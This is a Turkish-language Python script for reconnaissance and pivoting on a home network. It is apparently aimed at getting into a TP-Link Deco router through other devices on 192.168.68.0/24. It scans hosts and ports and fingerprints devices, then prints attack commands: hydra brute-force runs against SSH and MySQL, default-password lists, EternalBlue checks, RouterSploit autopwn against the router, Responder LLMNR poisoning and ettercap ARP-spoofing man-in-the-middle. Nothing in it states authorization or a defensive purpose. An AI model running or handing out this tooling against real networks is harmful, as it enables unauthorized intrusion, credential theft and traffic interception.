#!/usr/bin/env python3
"""
Ağ Keşif ve Pivot Scripti
TP-Link Deco'ya erişemediysek, ağdaki diğer cihazlar üzerinden saldırı vektörleri arar
"""

import socket
import subprocess
import json
import re
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import ipaddress

NETWORK = "192.168.68.0/24"
DECO_IP = "192.168.68.1"

print("="*70)
print("[*] AĞ KEŞİF VE PIVOT ARACI")
print("="*70)

# 1. ARP taraması ile canlı hostları bul
print("\n[1] ARP taraması ile canlı hostlar bulunuyor...")
live_hosts = []

try:
    result = subprocess.run(['arp-scan', '--localnet'], capture_output=True, text=True, timeout=30)
    for line in result.stdout.split('\n'):
        match = re.search(r'(\d+\.\d+\.\d+\.\d+)\s+([0-9a-f:]+)', line.lower())
        if match:
            ip = match.group(1)
            mac = match.group(2)
            if ip != DECO_IP:  # Deco dışındakiler
                live_hosts.append({'ip': ip, 'mac': mac})
                print(f"[+] {ip} - {mac}")
except FileNotFoundError:
    print("[!] arp-scan yüklü değil, nmap kullanılıyor...")
    result = subprocess.run(['nmap', '-sn', NETWORK], capture_output=True, text=True)
    for line in result.stdout.split('\n'):
        match = re.search(r'Nmap scan report for (\d+\.\d+\.\d+\.\d+)', line)
        if match:
            ip = match.group(1)
            if ip != DECO_IP:
                live_hosts.append({'ip': ip, 'mac': 'unknown'})
                print(f"[+] {ip}")

print(f"\n[+] Toplam {len(live_hosts)} canlı host bulundu (Deco hariç)")

# 2. Her host için port taraması
print("\n[2] Port taraması başlatılıyor...")

# İlginç portlar
INTERESTING_PORTS = {
    21: 'FTP',
    22: 'SSH',
    23: 'Telnet',
    80: 'HTTP',
    443: 'HTTPS',
    445: 'SMB',
    548: 'AFP',
    631: 'IPP',
    1080: 'SOCKS',
    1900: 'UPnP',
    2323: 'Telnet (alt)',
    3000: 'Grafana',
    3306: 'MySQL',
    3389: 'RDP',
    5000: 'UPnP',
    5432: 'PostgreSQL',
    5900: 'VNC',
    6379: 'Redis',
    8000: 'HTTP (alt)',
    8080: 'HTTP Proxy',
    8081: 'HTTP (alt)',
    8443: 'HTTPS (alt)',
    8888: 'HTTP (alt)',
    9000: 'PHP-FPM',
    9090: 'Prometheus',
    9200: 'Elasticsearch',
    27017: 'MongoDB',
}

vulnerable_hosts = []

def scan_host(host_info):
    ip = host_info['ip']
    mac = host_info.get('mac', 'unknown')
    
    open_ports = []
    for port, service in INTERESTING_PORTS.items():
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((ip, port))
        if result == 0:
            open_ports.append((port, service))
            print(f"    [+] {ip}:{port} - {service} AÇIK")
        sock.close()
    
    if open_ports:
        return {
            'ip': ip,
            'mac': mac,
            'open_ports': open_ports
        }
    return None

# Paralel tarama
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = {executor.submit(scan_host, host): host for host in live_hosts}
    for future in as_completed(futures):
        result = future.result()
        if result:
            vulnerable_hosts.append(result)

print(f"\n[+] {len(vulnerable_hosts)} hostta açık port bulundu")

# 3. Web servislerini detaylı analiz et
print("\n[3] Web servisleri analiz ediliyor...")

def check_web_service(ip, port, ssl=False):
    protocol = 'https' if ssl else 'http'
    url = f"{protocol}://{ip}:{port}"
    
    try:
        r = requests.get(url, timeout=3, verify=False, allow_redirects=True)
        
        info = {
            'url': url,
            'status': r.status_code,
            'server': r.headers.get('Server', 'Unknown'),
            'title': '',
            'interesting': []
        }
        
        # Başlık
        title_match = re.search(r'<title>(.*?)</title>', r.text, re.IGNORECASE)
        if title_match:
            info['title'] = title_match.group(1)
        
        # İlginç kelimeler
        interesting_keywords = ['camera', 'login', 'admin', 'setup', 'wizard', 'config', 
                               'firmware', 'update', 'shell', 'command', 'execute', 'debug',
                               'nas', 'storage', 'media', 'dlna', 'printer', 'scanner']
        
        for keyword in interesting_keywords:
            if keyword in r.text.lower():
                info['interesting'].append(keyword)
        
        # Özel cihaz tespiti
        device_signatures = {
            'Hikvision': ['hikvision', 'web components'],
            'Dahua': ['dahua', 'web service'],
            'TP-Link': ['tplink', 'tp-link'],
            'Xiaomi': ['xiaomi', 'mi home'],
            'Samsung': ['samsung', 'smarttv'],
            'LG': ['lg', 'webos'],
            'Sony': ['sony', 'bravia'],
            'Philips': ['philips', 'hue'],
            'Epson': ['epson', 'printer'],
            'HP': ['hp', 'hewlett-packard'],
            'Canon': ['canon'],
            'Brother': ['brother'],
            'Synology': ['synology', 'diskstation'],
            'QNAP': ['qnap', 'qts'],
            'Western Digital': ['wd', 'my cloud'],
            'Raspberry Pi': ['raspberry', 'pi-hole'],
        }
        
        text_lower = r.text.lower()
        for device, signatures in device_signatures.items():
            for sig in signatures:
                if sig in text_lower:
                    info['device_type'] = device
                    break
        
        return info
        
    except Exception as e:
        return None

# Web servislerini kontrol et
for host in vulnerable_hosts:
    ip = host['ip']
    for port, service in host['open_ports']:
        if port in [80, 8080, 8000, 8888, 9000]:
            info = check_web_service(ip, port)
            if info:
                print(f"\n[!] {ip}:{port}")
                print(f"    Başlık: {info['title']}")
                print(f"    Server: {info['server']}")
                if info.get('device_type'):
                    print(f"    Cihaz Tipi: {info['device_type']}")
                if info['interesting']:
                    print(f"    Anahtar kelimeler: {', '.join(set(info['interesting']))}")
                
                host['web_info'] = info

# 4. UPnP/SSDP keşfi
print("\n[4] UPnP/SSDP cihaz keşfi...")

SSDP_MSG = 'M-SEARCH * HTTP/1.1\r\n' \
           'HOST:239.255.255.250:1900\r\n' \
           'ST:upnp:rootdevice\r\n' \
           'MX:2\r\n' \
           'MAN:"ssdp:discover"\r\n' \
           '\r\n'

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(3)
sock.sendto(SSDP_MSG.encode(), ('239.255.255.250', 1900))

upnp_devices = []
try:
    while True:
        data, addr = sock.recvfrom(65507)
        if addr[0] != DECO_IP:
            upnp_devices.append({'ip': addr[0], 'data': data.decode()})
            print(f"[+] UPnP cihaz: {addr[0]}")
            
            # Location URL'ini çıkar
            for line in data.decode().split('\r\n'):
                if line.startswith('LOCATION:'):
                    location = line.split(' ')[1]
                    print(f"    Location: {location}")
                    
                    # XML'i çek
                    try:
                        r = requests.get(location, timeout=2)
                        if 'friendlyName' in r.text:
                            name_match = re.search(r'<friendlyName>(.*?)</friendlyName>', r.text)
                            if name_match:
                                print(f"    Cihaz Adı: {name_match.group(1)}")
                    except:
                        pass
except socket.timeout:
    pass
sock.close()

# 5. Zafiyet taraması önerileri
print("\n[5] POTANSİYEL ZAFİYET VEKTÖRLERİ")
print("="*70)

# Bulunan servislere göre zafiyet önerileri
for host in vulnerable_hosts:
    ip = host['ip']
    print(f"\n[*] Hedef: {ip}")
    
    for port, service in host['open_ports']:
        # Servis bazlı zafiyet önerileri
        if port == 22:
            print(f"    SSH ({port}): Brute-force dene - hydra, medusa")
            print(f"        Komut: hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://{ip}")
        
        elif port == 23:
            print(f"    TELNET ({port}): Varsayılan şifreler dene")
            print(f"        Komut: telnet {ip}")
            print(f"        Şifreler: admin/admin, root/root, admin/password")
        
        elif port == 445:
            print(f"    SMB ({port}): Null session, EternalBlue kontrolü")
            print(f"        Komut: smbclient -L //{ip} -N")
            print(f"        Komut: nmap --script smb-vuln-ms17-010 -p 445 {ip}")
        
        elif port in [80, 8080, 8000, 8888]:
            print(f"    HTTP ({port}): Web zafiyet taraması")
            print(f"        Komut: nikto -h http://{ip}:{port}")
            print(f"        Komut: dirb http://{ip}:{port}")
            
            # Özel cihaz exploit'leri
            if 'web_info' in host and host['web_info'].get('device_type'):
                device = host['web_info']['device_type']
                print(f"        [!] {device} için özel exploit ara:")
                print(f"        Komut: searchsploit {device.lower()}")
        
        elif port == 1900:
            print(f"    UPnP ({port}): UPnP exploit")
            print(f"        Komut: nmap --script upnp-info -p 1900 {ip}")
        
        elif port == 3306:
            print(f"    MySQL ({port}): Brute-force")
            print(f"        Komut: hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{ip}")
        
        elif port == 6379:
            print(f"    Redis ({port}): Unauthorized access")
            print(f"        Komut: redis-cli -h {ip} INFO")

# 6. Deco'ya pivot için öneriler
print("\n[6] DECO'YA PIVOT STRATEJİLERİ")
print("="*70)

if vulnerable_hosts:
    print("\n[*] Bulunan cihazlar üzerinden Deco'ya erişim:")
    
    for host in vulnerable_hosts:
        ip = host['ip']
        
        # Eğer cihaz TP-Link ise
        if 'web_info' in host:
            if 'device_type' in host['web_info'] and 'TP-Link' in host['web_info']['device_type']:
                print(f"\n[!] {ip} - Başka bir TP-Link cihazı!")
                print(f"    Bu cihazın admin panelinden Deco'nun mesh ağına bağlı olduğunu doğrula.")
                print(f"    Varsayılan şifreleri dene: admin/admin, admin/tplink")
                print(f"    Cihazdan Deco'nun şifresini çalmak mümkün olabilir.")
            
            # Eğer NAS/Storage ise
            if any(kw in host['web_info'].get('title', '').lower() for kw in ['nas', 'storage', 'cloud']):
                print(f"\n[!] {ip} - NAS/Storage cihazı!")
                print(f"    Bu cihazda Deco'nun yedek konfigürasyonu olabilir.")
                print(f"    SMB/FTP/WebDAV paylaşımlarını kontrol et.")
            
            # IP Camera ise
            if 'camera' in host['web_info'].get('title', '').lower():
                print(f"\n[!] {ip} - IP Kamera!")
                print(f"    IP kameralarda genelde zafiyet çoktur.")
                print(f"    Varsayılan şifreler: admin/admin, admin/12345, root/pass")
                print(f"    RTSP stream: rtsp://{ip}:554/")

# 7. Otomatize exploit önerileri
print("\n[7] OTOMATİZE EXPLOIT ARAÇLARI")
print("="*70)
print("""
# Metasploit ile ağ taraması:
msfconsole -q -x "db_nmap -sV -p- 192.168.68.0/24; services; exit"

# RouterSploit ile TP-Link testi:
rsf.py -m scanners/autopwn -s "target=192.168.68.1"

# Bettercap ile ağ keşfi:
sudo bettercap -eval "net.probe on; net.show; exit"

# Responder ile LLMNR/NBT-NS poisoning:
sudo responder -I eth0 -wrf

# ARP spoofing ile MITM:
sudo ettercap -T -M arp:remote /192.168.68.1// /192.168.68.0-255//
""")

# Sonuçları kaydet
with open('network_discovery.json', 'w') as f:
    json.dump({
        'live_hosts': live_hosts,
        'vulnerable_hosts': vulnerable_hosts,
        'upnp_devices': upnp_devices
    }, f, indent=2)

print("\n[+] Sonuçlar network_discovery.json dosyasına kaydedildi.")
print("[*] Tarama tamamlandı!")